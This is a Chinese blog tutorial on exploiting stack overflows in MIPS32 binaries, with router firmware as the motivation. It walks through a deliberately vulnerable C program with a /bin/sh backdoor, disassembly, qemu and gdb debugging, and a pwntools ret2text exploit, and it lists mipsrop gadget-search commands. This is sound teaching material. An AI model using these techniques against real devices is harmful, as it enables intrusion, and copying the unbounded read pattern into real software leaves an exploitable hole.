
<!DOCTYPE html>
<html lang="" class="loading">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>路由器漏洞利用之栈溢出 - 知世の小屋</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="知世,"> 
    <meta name="description" content="my blogs,
缓冲区溢出漏洞是很常见的漏洞，广泛存在于各个软件中，相信在学习pwn的过程中，大多数pwn师傅第一个学会的就是栈溢出的利用了，本文将介绍如何在MIPS32架构中利用栈溢出漏洞

MIPS汇编的一些,"> 
    <meta name="author" content="知世"> 
    <link rel="alternative" href="atom.xml" title="知世の小屋" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <link rel="stylesheet" href="/css/diaspora.css">
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
</head>
</html>
<body class="loading">
    <span id="config-title" style="display:none">知世の小屋</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;" data-url="https://nightRainy.github.io"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle">路由器漏洞利用之栈溢出</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class="main">
        <h1 class="title">路由器漏洞利用之栈溢出</h1>
        <div class="stuff">
            <span>十一月 20, 2019</span>
            

        </div>
        <div class="content markdown">
            <blockquote>
<p>缓冲区溢出漏洞是很常见的漏洞，广泛存在于各个软件中，相信在学习pwn的过程中，大多数pwn师傅第一个学会的就是栈溢出的利用了，本文将介绍如何在MIPS32架构中利用栈溢出漏洞</p>
</blockquote>
<h1 id="MIPS汇编的一些小知识"><a href="#MIPS汇编的一些小知识" class="headerlink" title="MIPS汇编的一些小知识"></a>MIPS汇编的一些小知识</h1><p>因为不是本文讨论重点,这里仅做简单描述</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>1.通用寄存器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zero -&gt; 值始终为0</span><br><span class="line">$at -&gt; 保留寄存器</span><br><span class="line">$v0-$v1 -&gt; 保存表达式或者程序返回结果</span><br><span class="line">$a0-$v3 -&gt; 函数调用的前四个参数</span><br><span class="line">$t0-t7 -&gt; 临时寄存器</span><br><span class="line">$s0-$s7 -&gt; 保存函数调用期间必须保存的原值</span><br><span class="line">$t8-$t9 -&gt; 临时寄存器,拓展t0-t7</span><br><span class="line">$k0-$k1 -&gt; 保留,中断处理函数使用</span><br><span class="line">$gp -&gt; 全局指针</span><br><span class="line">$sp -&gt; 栈顶指针</span><br><span class="line">$fp -&gt; 保存栈指针</span><br><span class="line">$ra -&gt; 保存返回地址</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li>特殊寄存器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PC -&gt; 程序计数器</span><br><span class="line">HI -&gt; 乘除结果高位寄存器</span><br><span class="line">LO -&gt; 乘除结果低位寄存器</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><ol>
<li>LOAD/STORE指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lb,lbu,lh,lhu,ll,lw,lwl,lwr,sb,sc,sh,sw,swl,swr,move</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>其中以l开头为加载,s开头为存储,其中move指令用于寄存器之间的值传递</p>
<ol start="2">
<li>算术运算指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add,addi,addiu,addiu,sub,subu,clo,clz,slt,slti,sltiu,sltu,mul,mult,multu,madd,msub,msubu,div,divu</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>3.类比较指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slt,slti,sltiu,sltu</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>SYSCALL</li>
</ol>
<p>依旧是软中断,用于执行系统调用</p>
<h1 id="MIPS堆栈原理"><a href="#MIPS堆栈原理" class="headerlink" title="MIPS堆栈原理"></a>MIPS堆栈原理</h1><p>在平常的linux pwn中我们遇到的系统架构多为x86体系，但在路由器的嵌入式系统中，很大一部分都是MIPS指令系统，而这两个系统在很多方面都有差异，这里主介绍我们利用漏洞所需要注意几个方面</p>
<ol>
<li><p>MIPS32架构中是没有EBP寄存器的，他在进入函数时是将当前栈指针向下移动n比特到该函数的stack frame存储空间，函数返回时再加上偏移量恢复栈指针</p>
</li>
<li><p>因为第一点的原因，寄存器出入栈时都需要指定偏移量</p>
</li>
<li><p>传参过程中，前四个参数$a0-$a3，多余的会保存在调用函数的预留的栈顶空间内</p>
</li>
<li><p>MIPS调用函数时会把函数的返回地址直接存入$RA寄存器</p>
</li>
</ol>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>在MIPS32架构中，函数被分为两种即叶子函数和非叶子函数。所谓叶子函数就是在该函数中不再调用其他函数的函数，反之，有其他函数调用的即是非叶子函数</p>
<p>举个栗子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void A(int *a,int *b)</span><br><span class="line">&#123;</span><br><span class="line">    int tmp(0);</span><br><span class="line">    tmp=a;</span><br><span class="line">    a=b;</span><br><span class="line">    b=tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void B()</span><br><span class="line">&#123;</span><br><span class="line">    int a(0),b(13);</span><br><span class="line">    A(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的A就是叶子函数，B为非叶子函数，而这两种函数在调用时也有很大区别:</p>
<p>拿上面的B来说好了，B函数在执行到第二行时即调用A函数时，先复制$PC寄存器的值到$RA,然后跳转到A函数，因为A是叶子函数，所以返回B的地址依然在$RA中，但如果是非叶子函数，呢么会将返回B的地址存在堆栈中<br>而在函数返回的时候，因为A是叶子函数，因此就直接用”jr $ra”返回B，否则先从堆栈中取出返回值，存到$ra中，后面的步骤就和叶子函数相同了</p>
<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>我们知道函数被分为了叶子函数和非叶子函数，他们的函数调用过程也不尽相同，因此在分析溢出时也要分为叶子函数和非叶子函数了分析</p>
<h2 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h2><p>从函数调用过程中我们知道在调用非叶子函数时，会把返回地址存入堆栈，因此我们拿一个简单的例子来说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void backdoor()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vlun()</span><br><span class="line">&#123;</span><br><span class="line">    char dst[20]=&#123;0&#125;;</span><br><span class="line">    read(0,&amp;dst,1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    vlun();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们编译一下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gcc no_leaf.c -static -o no_leaf</span><br></pre></td></tr></table></figure></p>
<p>这里我们反编译一下程序</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">                     **************************************************************</span><br><span class="line">                     *                          FUNCTION                          *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     undefined main()</span><br><span class="line">     undefined         v0:1           &lt;RETURN&gt;</span><br><span class="line">     undefined4        Stack[-0x4]:4  local_4                                 XREF[1]:     00400438(W)  </span><br><span class="line">     undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     0040043c(W)  </span><br><span class="line">                     main                                            XREF[3]:     Entry Point(*), </span><br><span class="line">                                                                                  __start:00400188(*), 0041f200(*)  </span><br><span class="line">00400434 e0 ff bd 27     addiu      sp,sp,-0x20</span><br><span class="line">00400438 1c 00 bf af     sw         ra,local_4(sp)</span><br><span class="line">0040043c 18 00 be af     sw         s8,local_8(sp)</span><br><span class="line">00400440 25 f0 a0 03     or         s8,sp,zero</span><br><span class="line">00400444 f1 00 10 0c     jal        vlun                                             undefined vlun()</span><br><span class="line">00400448 00 00 00 00     _nop</span><br><span class="line">0040044c 00 00 00 00     nop</span><br><span class="line">00400450 25 e8 c0 03     or         sp,s8,zero</span><br><span class="line">00400454 1c 00 bf 8f     lw         ra,0x1c(sp)</span><br><span class="line">00400458 18 00 be 8f     lw         s8,0x18(sp)</span><br><span class="line">0040045c 20 00 bd 27     addiu      sp,sp,0x20</span><br><span class="line">00400460 08 00 e0 03     jr         ra</span><br></pre></td></tr></table></figure>
<h3 id="vuln函数"><a href="#vuln函数" class="headerlink" title="vuln函数"></a>vuln函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                     **************************************************************</span><br><span class="line">                     *                          FUNCTION                          *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     undefined vlun()</span><br><span class="line">     undefined         v0:1           &lt;RETURN&gt;</span><br><span class="line">     undefined4        Stack[-0x4]:4  local_4                                 XREF[1]:     004003c8(W)  </span><br><span class="line">     undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     004003cc(W)  </span><br><span class="line">     undefined4        Stack[-0x28]:4 local_28                                XREF[1]:     004003dc(W)  </span><br><span class="line">                     vlun                                            XREF[2]:     Entry Point(*), main:00400444(c)  </span><br><span class="line">004003c4 c8 ff bd 27     addiu      sp,sp,-0x38</span><br><span class="line">004003c8 34 00 bf af     sw         ra,local_4(sp)</span><br><span class="line">004003cc 30 00 be af     sw         s8,local_8(sp)</span><br><span class="line">004003d0 25 f0 a0 03     or         s8,sp,zero</span><br><span class="line">004003d4 42 00 1c 3c     lui        gp,0x42</span><br><span class="line">004003d8 e0 71 9c 27     addiu      gp=&gt;_gp,gp,0x71e0</span><br><span class="line">004003dc 10 00 bc af     sw         gp=&gt;_gp,local_28(sp)</span><br><span class="line">004003e0 18 00 c0 af     sw         zero,0x18(s8)</span><br><span class="line">004003e4 1c 00 c0 af     sw         zero,0x1c(s8)</span><br><span class="line">004003e8 20 00 c0 af     sw         zero,0x20(s8)</span><br><span class="line">004003ec 24 00 c0 af     sw         zero,0x24(s8)</span><br><span class="line">004003f0 28 00 c0 af     sw         zero,0x28(s8)</span><br><span class="line">004003f4 e8 03 06 24     li         a2,0x3e8</span><br><span class="line">004003f8 18 00 c2 27     addiu      v0,s8,0x18</span><br><span class="line">004003fc 25 28 40 00     or         a1,v0,zero</span><br><span class="line">00400400 25 20 00 00     or         a0,zero,zero</span><br><span class="line">00400404 34 80 82 8f     lw         v0,-0x7fcc(gp)=&gt;-&gt;read                           = 004004ac</span><br><span class="line">00400408 25 c8 40 00     or         t9,v0,zero</span><br><span class="line">0040040c 27 00 11 04     bal        read                                             ssize_t read(int __fd, void * __</span><br><span class="line">00400410 00 00 00 00     _nop</span><br><span class="line">00400414 10 00 dc 8f     lw         gp,0x10(s8)</span><br><span class="line">00400418 00 00 00 00     nop</span><br><span class="line">0040041c 25 e8 c0 03     or         sp,s8,zero</span><br><span class="line">00400420 34 00 bf 8f     lw         ra,0x34(sp)</span><br><span class="line">00400424 30 00 be 8f     lw         s8,0x30(sp)</span><br><span class="line">00400428 38 00 bd 27     addiu      sp,sp,0x38</span><br><span class="line">0040042c 08 00 e0 03     jr         ra</span><br><span class="line">00400430 00 00 00 00     _nop</span><br></pre></td></tr></table></figure>
<p>可以看到因为是非叶子函数,因此我们计算完偏移后可以直接使用ret2text的办法来完成利用<br>这里简单提一下gdb调试mips架构的方法,我这里安装了pwndbg插件,并且需要安装gdb-multiarch<br>调试方法如下:</p>
<ol>
<li><p>qemu调起程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 9981 -L mipsel-linux-gnu ./no_leaf</span><br></pre></td></tr></table></figure>
</li>
<li><p>gdb-multiarc attach调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">target remote localhost:9981</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>然后就可以进行基本调试了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────</span><br><span class="line"> V0   0x0</span><br><span class="line"> V1   0x0</span><br><span class="line"> A0   0x0</span><br><span class="line"> A1   0x0</span><br><span class="line"> A2   0x0</span><br><span class="line"> A3   0x0</span><br><span class="line"> T0   0x0</span><br><span class="line"> T1   0x0</span><br><span class="line"> T2   0x0</span><br><span class="line"> T3   0x0</span><br><span class="line"> T4   0x0</span><br><span class="line"> T5   0x0</span><br><span class="line"> T6   0x0</span><br><span class="line"> T7   0x0</span><br><span class="line"> T8   0x0</span><br><span class="line"> T9   0x0</span><br><span class="line"> S0   0x0</span><br><span class="line"> S1   0x0</span><br><span class="line"> S2   0x0</span><br><span class="line"> S3   0x0</span><br><span class="line"> S4   0x0</span><br><span class="line"> S5   0x0</span><br><span class="line"> S6   0x0</span><br><span class="line"> S7   0x0</span><br><span class="line"> S8   0x0</span><br><span class="line"> FP   0x0</span><br><span class="line"> SP   0x76ffefb0 ◂— 0x1</span><br><span class="line"> PC   0x400170 ◂— move   $zero, $ra /* &apos;%&apos; */</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line"> ► 0x400170    move   $zero, $ra</span><br><span class="line">   0x400174    bal    0x40017c</span><br><span class="line">   0x400178    nop    </span><br><span class="line">   0x40017c    lui    $gp, 0x42</span><br><span class="line">   0x400180    addiu  $gp, $gp, 0x71e0</span><br><span class="line">   0x400184    move   $ra, $zero</span><br><span class="line">   0x400188    lw     $a0, -0x7fe0($gp)</span><br><span class="line">   0x40018c    lw     $a1, ($sp)</span><br><span class="line">   0x400190    addiu  $a2, $sp, 4</span><br><span class="line">   0x400194    addiu  $at, $zero, -8</span><br><span class="line">   0x400198    and    $sp, $sp, $at</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp  0x76ffefb0 ◂— 0x1</span><br><span class="line">01:0004│     0x76ffefb4 —▸ 0x76fff16a ◂— &apos;./no_leaf&apos;</span><br><span class="line">02:0008│     0x76ffefb8 ◂— 0x0</span><br><span class="line">03:000c│     0x76ffefbc —▸ 0x76fff174 ◂— &apos;_=/usr/bin/qemu-mipsel&apos;</span><br><span class="line">04:0010│     0x76ffefc0 —▸ 0x76fff18b ◂— &apos;LC_CTYPE=en_US.UTF-8&apos;</span><br><span class="line">05:0014│     0x76ffefc4 —▸ 0x76fff1a0 ◂— 0x435f534c (&apos;LS_C&apos;)</span><br><span class="line">06:0018│     0x76ffefc8 —▸ 0x76fff728 ◂— &apos;LSCOLORS=Gxfxcxdxbxegedabagacad&apos;</span><br><span class="line">07:001c│     0x76ffefcc —▸ 0x76fff748 ◂— &apos;LESS=-R&apos;</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0   400170</span><br></pre></td></tr></table></figure></p>
<p>这里就用简单的cyclic指令生成一串字符串来测试偏移<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure></p>
<p>输入字符串后程序崩溃</p>
<p>可以看到pwndbg里输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616168 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────</span><br><span class="line"> V0   0xc9</span><br><span class="line"> V1   0x0</span><br><span class="line"> A0   0x0</span><br><span class="line"> A1   0x76ffee28 ◂— 0x61616161 (&apos;aaaa&apos;)</span><br><span class="line"> A2   0x3e8</span><br><span class="line"> A3   0x0</span><br><span class="line"> T0   0x81010303</span><br><span class="line"> T1   0x666165</span><br><span class="line"> T2   0x2f494e4a (&apos;JNI/&apos;)</span><br><span class="line"> T3   0xffffffff</span><br><span class="line"> T4   0x0</span><br><span class="line"> T5   0x0</span><br><span class="line"> T6   0x0</span><br><span class="line"> T7   0x0</span><br><span class="line"> T8   0x9</span><br><span class="line"> T9   0x400470 ◂— lui    $gp, 2</span><br><span class="line"> S0   0x0</span><br><span class="line"> S1   0x41f000 ◂— 0xffffffff</span><br><span class="line"> S2   0x0</span><br><span class="line"> S3   0x0</span><br><span class="line"> S4   0x0</span><br><span class="line"> S5   0x0</span><br><span class="line"> S6   0x0</span><br><span class="line"> S7   0x0</span><br><span class="line"> S8   0x61616167 (&apos;gaaa&apos;)</span><br><span class="line"> FP   0x76ffee48 ◂— &apos;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line"> SP   0x76ffee48 ◂— &apos;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line"> PC   0x61616168 (&apos;haaa&apos;)</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x61616168</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x76ffee48 ◂— &apos;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">01:0004│        0x76ffee4c ◂— &apos;jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">02:0008│        0x76ffee50 ◂— &apos;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">03:000c│        0x76ffee54 ◂— &apos;laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">04:0010│        0x76ffee58 ◂— &apos;maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">05:0014│        0x76ffee5c ◂— &apos;naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">06:0018│        0x76ffee60 ◂— &apos;oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">07:001c│        0x76ffee64 ◂— &apos;paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n&apos;</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0 61616168</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV</span><br></pre></td></tr></table></figure></p>
<p>利用cyclic -l查看偏移可以得到偏移量为28<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x61616168</span><br><span class="line">28</span><br></pre></td></tr></table></figure></p>
<p>exp和正常的pwn没什么区别,<br>本例exp如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./no_leaf&quot;)</span><br><span class="line">payload=&apos;a&apos;*0x38+p32(0x400370)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h2><p>在上述的介绍中可以知道,叶子函数是不存在堆栈上的,他会将返回地址存在$ra指针中,因此叶子函数的栈溢出并不好利用,但是在可以大量溢出的情况下,我们还是可以利用叶子函数的溢出的</p>
<h2 id="rop的使用"><a href="#rop的使用" class="headerlink" title="rop的使用"></a>rop的使用</h2><p>在做正常的pwn题时,构造rop链是一种非常具有杀伤力的攻击手段,在mips架构中自然也不逞多让,平常我们构造rop链可以通过ropgadget来自动化搜索gadget,而mips架构中也有一个很好用的搜索gadget的插件,即使用IDA的<a href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop" target="_blank" rel="noopener">mipsgadget插件</a></p>
<p><strong><em>注:本插件适用于IDA6.8,但IDA7.0其实也有大师傅写了相应的脚本</em></strong></p>
<p>使用方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.help()           帮助菜单</span><br><span class="line">mipsrop.doubles()        打印一系列函数调用gadget</span><br><span class="line">mipsrop.stackfinder()    寻找栈数据可控的 rop，放到寄存器中</span><br><span class="line">mipsrop.summary()        列出所有的可用 rop</span><br><span class="line">mipsrop.system()         列出用于执行system函数</span><br><span class="line">mipsrop.find(xxx)        查找特定rop</span><br><span class="line">mipsrop.tails()          列出将栈上的数据保存在$ra等寄存器中的rop</span><br></pre></td></tr></table></figure></p>
<p>具体rop的使用和正常的pwn利用没有什么特别大的区别,这里也不再过多阐述</p>
